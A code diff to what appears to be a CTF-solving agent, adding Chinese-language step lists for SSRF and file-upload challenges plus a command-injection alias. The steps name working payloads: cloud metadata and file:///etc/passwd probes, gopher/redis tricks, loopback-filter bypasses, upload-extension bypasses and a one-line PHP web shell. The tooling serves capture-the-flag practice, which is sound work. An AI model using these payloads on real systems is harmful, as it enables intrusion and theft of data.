@@ -168,6 +168,24 @@ CTF_QUICK_PATHS: dict[str, list[str]] = {
         "尝试 ;env 读环境变量",
         "在响应中搜索 flag{} 模式",
     ],
+    "ssrf": [
+        "使用 recon_bundle 定位接收 URL/地址的参数(?url=/?target=/?path=/?dest=,图片抓取、webhook、PDF 生成、代理转发等入口)",
+        "Step 1: 用 http://127.0.0.1/ 等本地回环确认 SSRF 存在,对比响应状态码/长度/报错差异",
+        "Step 2: 探测内网服务与常见端口: http://127.0.0.1:6379(redis)/:3306(mysql)/:8080/:9000,以及云元数据 http://169.254.169.254/latest/meta-data/",
+        "Step 3: 换协议读本地文件与打内网: file:///etc/passwd, file:///flag, dict://127.0.0.1:6379/info, gopher:// 构造 redis/mysql 协议报文",
+        "Step 4: 若有黑名单(拦 127.0.0.1/localhost),绕过写法: http://127.1, http://0x7f000001, http://2130706433, http://[::1], @ 混淆、短链/301 跳转、DNS rebinding",
+        "Step 5: 根据回显枚举内网路径/服务,定位 flag 或可进一步利用的接口",
+        "在响应中搜索 flag{} 模式",
+    ],
+    "upload": [
+        "使用 recon_bundle 定位上传表单/接口与上传后文件的访问路径(返回的 URL 或静态目录如 /uploads/)",
+        "Step 1: 先直传 .php 探测校验层次(前端 JS / 扩展名黑白名单 / Content-Type / 文件头 / 二次渲染)",
+        "Step 2: 扩展名绕过: shell.php.jpg, shell.pHp, .phtml/.php3/.php5/.phar, 双写 pphphp; 或传 .htaccess/.user.ini 让允许的后缀当 php 解析",
+        "Step 3: Content-Type 改 image/png; 幻数绕过在木马前加 GIF89a; 若强制图片则图片马配合 LFI/包含触发",
+        "Step 4: 解析漏洞(Nginx/IIS 目录解析、Apache 多后缀)、旧环境 %00 截断 shell.php%00.jpg",
+        "Step 5: 上传成功后访问 webshell 路径执行命令: 传最小 <?php system($_GET[0]); ?> 再 ?0=cat /flag",
+        "在响应中搜索 flag{} 模式",
+    ],
     "web": [
         "使用 recon_bundle 快速获取目标首页 HTML、JS、表单、路由和目录",
         "若观察到 /visit + /admin + 登录/注册表单，优先验证 bot-XSS / cookie theft 链",
@@ -202,6 +220,14 @@ CTF_QUICK_PATHS: dict[str, list[str]] = {
         "在所有输出中搜索 flag{} 模式",
     ],
 }
+
+# "cmdi" is the chain-side canonical spelling for OS command injection; the
+# planner keyword classifier (pa_agent) and _WEBISH_CTF_TYPES use "cmd". Alias
+# so a challenge header of "Challenge type: cmdi" hits the command-injection
+# quick-path instead of silently falling through to the generic "web" steps.
+# CTF_QUICK_PATHS must cover every challenge type CTF_TOOL_CHAINS defines; this
+# invariant is pinned by test_ctf_quick_paths_cover_tool_chain_types.
+CTF_QUICK_PATHS["cmdi"] = CTF_QUICK_PATHS["cmd"]
 
 _BOT_XSS_TYPES = {"web", "xss"}
 _COOKIE_CLUE_RE = re.compile(
